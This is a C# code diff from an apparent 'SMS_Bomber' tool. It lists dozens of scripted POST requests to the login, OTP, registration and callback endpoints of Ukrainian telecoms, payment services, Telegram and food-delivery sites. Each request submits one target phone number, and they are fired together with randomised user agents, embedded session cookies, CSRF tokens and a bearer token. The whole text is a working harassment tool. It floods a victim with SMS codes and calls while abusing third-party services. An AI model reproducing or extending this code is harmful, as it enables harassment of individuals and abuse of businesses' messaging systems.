+                SendRequestAsync("https://auth2.multiplex.ua/login", HttpMethod.Post, $"{{\"login\":\"{phone}\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://friends.multiplex.ua/" },
+                    { "X-Mx-Source", "WEB-FRIENDS" },
+                }),
+
+                SendRequestAsync("https://comfy.ua/api/auth/password/dynamic", HttpMethod.Post, "login[username]=" + $"+{phone.Substring(0, 2)}({phone.Substring(2, 3)})-{phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://comfy.ua/ua/" },
+                }),
+
+                SendRequestAsync("https://smaki-maki.com/wp-admin/admin-ajax.php", HttpMethod.Post, "name=Никита+Чайник&phone=" + $"+{phone.Substring(0, 2)} ({phone.Substring(2, 3)}) {phone.Substring(5, 3)} {phone.Substring(8, 2)} {phone.Substring(10, 2)}" + "&birthday=23.01.1999&password=BHs4YPuCExRppym&password2=BHs4YPuCExRppym&code=&action=register_user&nonce_code=9b2bc24717", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://smaki-maki.com/" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                }),
+
+                SendRequestAsync("https://registration.vodafone.ua/api/v1/process/smsCode", HttpMethod.Post, $"{{\"number\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://registration.vodafone.ua/" },
+                }),
+
+                SendRequestAsync("https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute", HttpMethod.Post, $"{{\"params\":{{\"version\":\"2.1.8\",\"language\":\"ua\",\"source\":\"WebApp\",\"token\": null ,\"manufacture\":\"\",\"childNumber\":\"\",\"accessType\":\"\",\"spinner\": 1 }},\"requests\":{{\"loginV2\":{{\"id\":\"{phone.Substring(3)}\"}}}}}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://my.vodafone.ua/" },
+                }),
+
+                SendRequestAsync("https://mw-api.vodafone.ua/otp/api/one-time-password/secured", HttpMethod.Post, $"{{\"receiver\":\"{phone}\",\"receiverTypeKey\":\"PHONE-NUMBER\",\"typeKey\":\"MYVF-LOGIN-IOS\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://my.vodafone.ua/" },
+                    { "Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzY29wZSI6WyJ0bWZfbXNfYWN0aXZhdGlvbl9zZXJ2aWNlX3R5cGU6T1JERVItR0lGVCIsInRtZl9tc19jb21tdW5pY2F0aW9uX25vdGlmaWNhdGlvbl90eXBlOk5ld1NhbGVCaWxsIiwidG1mX21zX2N1c3RvbWVyX3Byb2ZpbGU6U0VMRi1DQVJFLUVNQUlMIiwidG1mX21zX2V2ZW50bWFrZXJfcHJvZmlsZV9ldmVudF9yZWFkIiwidG1mX21zX3Byb2R1Y3RfcHJvZmlsZTpTRFAgY2hhbm5lbDpNWVZPREFGT05FLUFQUCIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpTRFAtQ1JFQVRFLVNVQlNDUklQVElPTiIsInRtZl9tc19ldmVudG1ha2VyX3Byb2ZpbGVfZXZlbnRfdHlwZV9yZWFkIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkNIQU5HRS1TRVJWSUNFIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlRBUklGRi1QTEFOLUNIQU5HRSIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpERFMtREVBQ1RJVkFUSU9OIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkREUy1TWU5DLUFDVElWQVRJT04iLCJpdHNmX21zX2Fzc2V0X2NhdGVnb3J5Om15dmYtYXBwIiwidG1mX21zX3Byb2R1Y3RfcHJvZmlsZTpTRFAiLCJ0bWZfbXNfY29tbXVuaWNhdGlvbl9ub3RpZmljYXRpb25fdHlwZTpCYWxhbmNlSGlzdG9yeURldGFpbHMiLCJ0bWZfbXNfaW50ZXJhY3Rpb25fcHJvZmlsZTpSVE0gb3BlbmVkIiwiaXRzZl9tc19hc3NldF9jYXRlZ29yeTpteXZmYjJiLXJlcG9ydHMiLCJ0bWZfbXNfZXZlbnRtYWtlcl9wcm9maWxlX2V2ZW50X3R5cGVfc3RhdGVfcmVhZCIsIm9wZW5pZCIsInRtZl9tc19pbnRlcmFjdGlvbl9wcm9maWxlOkRVQSIsInRtZl9tc19ldmVudG1ha2VyX3Byb2ZpbGVfZXZlbnRfdHlwZV93cml0ZSIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpTSU0tQ0hBTkdFIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlNJTS1DSEFOR0UtQjJCIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkREUy1TWU5DLURFQUNUSVZBVElPTiIsIml0c2ZfbXNfYXNzZXRfY2F0ZWdvcnk6bXl2Zi1hcHAtYXZhdGFyIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlNEUC1ERUxFVEUtU1VCU0NSSVBUSU9OIiwidG1mX21zX2V2ZW50bWFrZXJfcHJvZmlsZV9ldmVudF90eXBlX3N0YXRlX3dyaXRlIiwiY2hhbm5lbDpNWVZPREFGT05FLVdFQiIsInRtZl9tc19xdWFsaWZpY2F0aW9uX3Byb2ZpbGU6UlRNOk1ZVk9EQUZPTkUtQVBQIiwidG1mX21zX2ludGVyYWN0aW9uX3Byb2ZpbGU6TVlWRi1TVEFUSVNUSUNTIl0sImV4cCI6MTcwMjk5ODkwNywiYWRkaXRpb25hbERldGFpbHMiOnsiUHJvZmlsZSI6Ik1ZVk9EQUZPTkUifSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9BTk9OWU1PVVMiXSwianRpIjoiOWUxODhjOTItYzc3Yi00NGM2LWFkZTYtMDQzZmQzNmJiYjEyIiwidGVuYW50IjoiWE0iLCJjbGllbnRfaWQiOiJ3ZWItbXl2b2RhZm9uZS1tdyJ9.O0Fn-8DU3eKdUwUpx6ayPmwRQ0X77qAlA6uGikqgC6CYBv95t32FncmMMH62on-57c7KpwDZdkPoYdyq-dvfkPN2au4bnWg4E7-eZ7p2fTdhrCatkcRZqbfNelj2FaHl1qrC4xHPWZtWUWdLWPTNnyULxZstMpPnzltpHTgQOOj2WyHqcWeOBeZbIuOPoN0JN7eAIXzYk1-TH7cxho2Eb6YI8FGoEfi5-fJhXV-F4rMtR1IgnKNvBp-r47n8uY3UQSTaaEWO0-ap7CrI0KeJfo1pjSkYI6HZGUPmiA0EMs4EDH9ZGdC7uCWfqacu-rz9jbkYtgfKRmbNOAclGZP89A" },
+                }),
+
+                SendRequestAsync("https://frutalina.com.ua/callmeback/", HttpMethod.Post, $"url=https://frutalina.com.ua/callmeback/&user=Никита&phone={phone}&time_to_call=", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://frutalina.com.ua/callmeback/" },
+                    { "Upgrade-Insecure-Requests", "1" }
+                }),
+
+                SendRequestAsync("https://deliveryflower.com.ua/pravku/call.php", HttpMethod.Post, $"telfon={phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://deliveryflower.com.ua/" },
+                    { "X-Requested-With", "XMLHttpRequest" }
+                }),
+
+                SendRequestAsync("https://api.portmone.com.ua/auth/v2/registration", HttpMethod.Post, $"{{\"client_id\": \"62608e08adc29a8d6dbc9754e659f125\",\"scope\": \"https://api.portmone.com.ua/auth/client\",\"username\": \"{phone}\",\"password\": \"sdfdfsdfs2323few\",\"email\": \"adsadsasd2211@gmail.com\",\"verificationType\": \"phone_call\",\"attribute1\": \"\\u0420\\u0435\\u0433\\u0438\\u0441\\u0442\\u0440\\u0430\\u0446\\u0438\\u044f \\u043d\\u0430 \\u0441\\u0430\\u0439\\u0442\\u0435 www.portmone.com https://www.portmone.com.ua/auth#signup\",\"verification_required\": true}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://www.portmone.com.ua/" },
+                    { "X-App-Uid", "a4242cb9e57b84ff73ed5061b296ece6" },
+                }),
+
+                SendRequestAsync("https://bi.ua/api/v1/accounts", HttpMethod.Post, "{\"grand_type\":\"call_code\",\"stage\":\"1\",\"login\":\"амогус\",\"phone\":\"" + phone + "\"}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://bi.ua/ukr/signup/" },
+                    { "Language", "uk" },
+                    { "Authorization", "Bearer null" },
+                    { "Cookie", "advanced-frontend=hdpepdrvghor7912u25i77bv6u; _csrf-frontend=bc0a155f4a22546aea0485eb780398e6b932acb89cb6f70e333b467ee8c4cdc1a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22QZ3UXDo7flFSnsEPvb6cmPJUk5oGBk7L%22%3B%7D" }
+                }),
+
+                SendRequestAsync("https://farsh.in.ua/wp-admin/admin-ajax.php", HttpMethod.Post, $"action=user_login&formData=tel=+{phone.Substring(0, 2)}({phone.Substring(2, 3)}){phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}&code=", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://farsh.in.ua/" },
+                    { "X-Requested-With", "XMLHttpRequest" }
+                }),
+
+                SendRequestAsync("https://gogo-pizza.eatery.club/site/v1/pre-login", HttpMethod.Post, $"{{\"phone\":\"{phone}\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                }),
+
+                SendRequestAsync("https://instafood.com.ua/ajax/callback-form", HttpMethod.Post, $"forms=forms-callback-application&modal=1&name=Никита+Борисенко&phone=+{phone.Substring(0, 2)}({phone.Substring(2, 3)}){phone.Substring(5, 3)}{phone.Substring(8)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "X-Csrf-Token", "2CzMPSK85UUrBuONVKbHGiqD0OI1h8XxCb3OJotD" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                }),
+
+                SendRequestAsync("https://sms-fly.ua/registration/confirm/", HttpMethod.Post, $"step=1&user_name={phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://sms-fly.ua/ru/registration/" },
+                    { "Upgrade-Insecure-Requests", "1" },
+                }),
+
+                SendRequestAsync("https://my.smsclub.mobi/auth?reg=1", HttpMethod.Post, $"_csrf=X-gTrBUDbTNKPFm5Y7-JMO8kwRA0nidXTH7buzEfhgduhWPIfC40f3hlAeAoi9N2h3GxImXtExM_O7TceSznUw==&RegisterForm[name]=1&RegisterForm[business]=1&RegisterForm[typeTrafik]=Чат-бот&RegisterForm[phone]=+{phone}&RegisterForm[email]=penisula233@gmail.com&RegisterForm[regRules]=0&RegisterForm[regRules]=1&cf-turnstile-response=0.hx2pbAy6W7MTAnjyN75p1JgcPaiZVwzRuTWaNEUGRuIj1plCeX_FZ7R9C2iqpD4-9muWh5Gh8GRcfkcFk5lai1V4bKM6yxIBJw0Zdxpomp7s3-eKLiJi3uFmvKCESXKS8z1xnmeAEy5CVWuR2bvUu86FrxRastFwDaMQbWbTeJvgWFA6yWPdhwVmGkWYvXJodx45X4XgcLmedDADbdtA4GLCYqa5Vy6mLrvgG55CL9HmEAD9L2DloIcTQzigcmlvH9CeFH1WkIoiSVEG6UnAo3XF76sd8KcHLLAc1XOgm4ALoq1DARoctZvPTo7C6k6lVzfLqbCKALdlDzd3ZgUk2jt2OZG6WPsh5rH464Q8N5It5e4-tZUn8ReBn6s1mUO0YVvdxa_vjzrDC-h_Twrn6Y18rjfiQfWksCGcdn7LBMls1D0mUGHE1m486DauD6KG.mf0c-NpLb6xRL39pqNZwGQ.d8dd43e4c8c48292121c65bde2fcfcd1289fbf3c39453bdb8bb1abcd456141c0&reg-button=", "text/html", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Cookie", "_session_sclub_smsclub_mobi=f499e9aa7d1dbf9e544aadf3f65132ea; _csrf=1mpdi-YL2YXYK4ZFhUp2Qs4DsEogH3aT; evercookie=id_visit=6d792e736d73636c75622e6d6f6269_4125518; id_visit=6d792e736d73636c75622e6d6f6269_4125518" },
+                    { "Referer", "https://my.smsclub.mobi/auth?reg=1" },
+                    { "Upgrade-Insecure-Requests", "1" },
+                }),
+
+                SendRequestAsync("https://auth.easypay.ua/api/check", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://easypay.ua/" },
+                    { "appid", "e63b0537-bf15-453f-8a02-d49f85261e61" },
+                    { "pageid", "663b83ef-bfe9-47d9-809b-98784d37a12c" },
+                    { "partnerkey", "easypay-v2" },
+                }),
+
+                SendRequestAsync("https://my.telegram.org/auth/send_password", HttpMethod.Post, $"phone=+{phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "X-Requested-With", "XMLHttpRequest" }
+                }),
+
+                SendRequestAsync("https://origami.phonet.com.ua/rest/public/widget/call-catchers/d494caf7-b9df-43ea-9148-e4871ba6cfe8/call?timestamp=1702982637220&utcOffset=-120", HttpMethod.Post, $"{{\"phone\":\"+{phone}\",\"utm\":{{\"source\":\"google\",\"medium\":\"organic\",\"campaign\":\"(not set)\",\"content\":\"(not set)\",\"term\":\"(not set)\"}},\"referrer\":\"https://www.google.com/\",\"telerSessionId\":\"9ac360f4-d4ce-49df-89aa-4287d7b4f904\",\"pageUrl\":\"https://panda-pizza.com.ua/\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://panda-pizza.com.ua/" }
+                }),
+
+                SendRequestAsync("https://origami.phonet.com.ua/rest/public/widget/call-catchers/24882f40-7a0d-4b8b-8bc0-b290c725c281/call?timestamp=1702985890430&utcOffset=-120", HttpMethod.Post, $"{{\"phone\":\"+{phone}\",\"utm\":{{\"source\":\"google\",\"medium\":\"organic\",\"campaign\":\"(not set)\",\"content\":\"(not set)\",\"term\":\"(not set)\"}},\"referrer\":\"https://www.google.com/\",\"telerSessionId\":\"05528ef7-8a36-4294-a549-96630df9e463\",\"pageUrl\":\"https://panda-sushi.com.ua/\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://panda-sushi.com.ua/" }
+                }),
+
+                SendRequestAsync("https://karuzo.ua/index.php?route=callback/callback/send", HttpMethod.Post, $"phone={phone.Substring(3)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "X-Requested-With", "XMLHttpRequest" }
+                }),
+
+                SendRequestAsync("https://966.ua/esputnik/getUserByPhone", HttpMethod.Post, $"{{\"phone\":\"+{phone.Substring(0, 2)} ({phone.Substring(2, 3)}) {phone.Substring(5, 3)} {phone.Substring(8, 2)} {phone.Substring(10, 2)}\"}}", "text/plain", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://966.ua/" },
+                    { "Cookie", "PHPSESSID=lkdaru98atm9tfgourbrkkl7h6; cityName=1; cityExtension=0000010539; BITRIX_SM_GUEST_ID=6719563; BITRIX_SM_SALE_UID=e848c4582d7d8288807954252036dc4b; cf_clearance=xDqpEKg3fWK94G8LweVDAwUip1xvIaKgTuHA4SoYGyE-1702986320-0-1-ee265f4.a1d01b6b.1bb732c6-0.2.1702986320; sc=B7E87D94-6AD1-7BCD-5FA3-6C20C6B724A9; googtrans=/ru/uk; googtrans=/ru/uk; BITRIX_SM_LAST_VISIT=19.12.2023+13%3A45%3A51" },
+                }),
+
+                SendRequestAsync("https://www.sushiya.ua/api/v1/user/auth", HttpMethod.Post, $"phone={phone.Substring(2)}&need_skeep=", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://www.sushiya.ua" },
+                    { "Referer", "https://www.sushiya.ua/" },
+                    { "Authorization", "Bearer demo" },
+                    { "Cookie", "5c56ddacb7d52afbab2130776ac59994=ed0j6pmrt2r60h9i5ij01v5df5; dae23e1f6b5bf8609e2224d695520311=uk-UA; popup_sushiya=61d015a3d466d1119c01095c4960ab10" },
+                }),
+
+                SendRequestAsync("https://yaposhka.com.ua/ua/brander_smsconfirm_customer/process/init/", HttpMethod.Post, $"form_action=https://yaposhka.com.ua/ua/brander_smsconfirm_customer/process/init/&telephone=+{phone.Substring(0, 3)}({phone.Substring(3, 3)}){phone.Substring(6, 3)}-{phone.Substring(9, 2)}-{phone.Substring(11)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://yaposhka.com.ua" },
+                    { "Referer", "https://yaposhka.com.ua/ua/" },
+                    { "Cookie", "PHPSESSID=i52oi798q2os1o4d9p6c9sa3cr; store_code=ua; private_content_version=updated-658189b4eb07f8.40387657; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-12-19%2014%3A17%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fyaposhka.com.ua%2Fua%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2023-12-19%2014%3A17%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fyaposhka.com.ua%2Fua%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36%20Edg%2F120.0.0.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fyaposhka.com.ua%2Fua%2F; form_key=zFRcq1vHcUNKjicO; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=zFRcq1vHcUNKjicO; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22google_ecommerce_data%22:1702988222%2C%22advanced-map-location%22:1702988226}" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                }),
+
+                SendRequestAsync("https://yoki.ua/lviv/wp-admin/admin-ajax.php", HttpMethod.Post, $"first_name=1&email=asdasdasdda@gmail.com&phone=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}+{phone.Substring(8, 2)}+{phone.Substring(10, 2)}&input_check_send_sms=&password=Nk57qwygzRfCQaS&password2=Nk57qwygzRfCQaS&agree=on&action=register_user&nonce=72f71b07c6", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://yoki.ua" },
+                    { "Referer", "https://yoki.ua/lviv/ru/product-category/roly/" },
+                    { "Cookie", "qtrans_front_language=ru; PHPSESSID=h5l0n1c0vl1iohb9gmcekbpiee; woocommerce_cart_hash=977184732ce7525ea95ce265be1b6bc7; shop_not_working=is_active; current_blog_id=4; geolocation=OK; not_working_popup=; disabled-orders=; enabled_maintenance=1; terminal_text=; type_delivery=courier; terminal_id=55b590c1-7cce-26fe-0177-1fcba8d500ce" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                }),
+
+                SendRequestAsync("https://yama.ua/api/ajax_forms/link/04553295_c194_47cf_9d42_d2cb05be53e4?destination=/menu&_wrapper_format=drupal_ajax&ajax_form=1&_wrapper_format=drupal_ajax", HttpMethod.Post, $"field_user_name[0][value]=&form_build_id=form-FXFlUfKkMMLqV83umAZO6jBf3wLlOYJEODGP6MV6guQ&form_id=user_register_form&antibot_key=kQN0tDNWy9ot6VW-v6aM8NPDkCpo1D0QmLIecY-GmzU&field_user_phone[0][value]=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}&mail=&pass[pass1]=Cg:_yVRyLCGm5_3&pass[pass2]=Cg:_yVRyLCGm5_3&_triggering_element_name=op&_triggering_element_value=Надіслати+смс+код&_drupal_ajax=1&ajax_page_state[theme]=personal&ajax_page_state[theme_token]=&ajax_page_state[libraries]=ajax_forms/main,antibot/antibot.form,basket/basket.js,basket/jquery.inputmask,basket_other/js,classy/base,classy/messages,core/drupal.autocomplete,core/drupal.form,core/internal.jquery.form,core/normalize,customer_city/geolocation,drupal_noty_messages/drupal_noty_messages,eu_cookie_compliance/eu_cookie_compliance_default,load_more_and_pager/ajax_init,paragraphs/drupal.paragraphs.unpublished,personal/catalog_page,personal/default,search_block/search_block.styles,system/base,user/drupal.user,views/views.ajax,views/views.module,webform/libraries.jquery.select2,webform/webform.element.inputmask,xswitcher/js", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://yama.ua" },
+                    { "Referer", "https://yama.ua/menu" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                }),
+
+                SendRequestAsync("https://pomidoros.com.ua/wp-content/themes/pomidoros/includes/register_login.php", HttpMethod.Post, $"register[]=1&register[]=&register[]=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}&register[]=penisula@gmail.com&register[]=bucha&register[]=asdadsadsad22", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://pomidoros.com.ua" },
+                    { "Referer", "https://pomidoros.com.ua/yslovia-dostavki/" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                    { "Cookie", "SSESSb6c0fc2e25b5bd66612ebddc782c9fc0=ab24c881ff5abd29fb5db1c0171dc20c; static-cached=1; region=bucha" },
+                }),
+
+                SendRequestAsync("https://vilki-palki.od.ua/api/secret/generate?lang=ukrainian", HttpMethod.Post, $"{{\"phone\":\"+{phone.Substring(0, 2)} ({phone.Substring(2, 3)}) {phone.Substring(5, 3)} {phone.Substring(8, 2)} {phone.Substring(10, 2)}\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://vilki-palki.od.ua" },
+                    { "Referer", "https://vilki-palki.od.ua/" },
+                }),
+
+                SendRequestAsync("https://prontopizza.ua/wp-admin/admin-ajax.php", HttpMethod.Post, $"first_name=1&last_name=2&birthday=01.01.2000&phone=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}+{phone.Substring(8, 2)}+{phone.Substring(10, 2)}&input_check_send_sms=&email=asdasdqweqweq@gmail.com&password=sAabsQX3RYReyi&password2=sAabsQX3RYReyi&agree=on&action=register_user", "application/x-www-form-urlencoded", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Origin", "https://prontopizza.ua" },
+                    { "Referer", "https://prontopizza.ua/" },
+                    { "X-Requested-With", "XMLHttpRequest" },
+                })
+            };
+
+            await Task.WhenAll(requests);
+
+            GC.Collect();
         }
 
-        static string GenerateUserAgent()
+        Console.WriteLine("Ended");
+        Console.ReadLine();
+    }
+
+    static async Task SendRequestAsync(string url, HttpMethod method, string data, string mediaType, Dictionary<string, string> headers)
+    {
+        using (HttpClient httpClient = new HttpClient())
         {
-            string[] userAgents = 
+            HttpRequestMessage httpRequest = new HttpRequestMessage(method, url);
+
+            httpRequest.Content = new StringContent(data);
+            httpRequest.Content.Headers.ContentType = new MediaTypeHeaderValue(mediaType);
+
+            foreach (var header in headers)
             {
+                httpRequest.Headers.Add(header.Key, header.Value);
+            }
+
+            try
+            {
+                HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
+                string content = await httpResponse.Content.ReadAsStringAsync();
+
+                Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] {httpRequest.RequestUri.Host}: {httpResponse.StatusCode}");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] Error: {e.Message}");
+            }
+        }
+    }
+
+    static string GenerateUserAgent()
+    {
+        string[] userAgents =
+        {
                 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
                 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
@@ -865,7 +860,6 @@ namespace SMS_Bomber
                 "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0"
             };
 
-            return userAgents[new Random().Next(userAgents.Length)];
-        }
+        return userAgents[new Random().Next(userAgents.Length)];
     }
 }
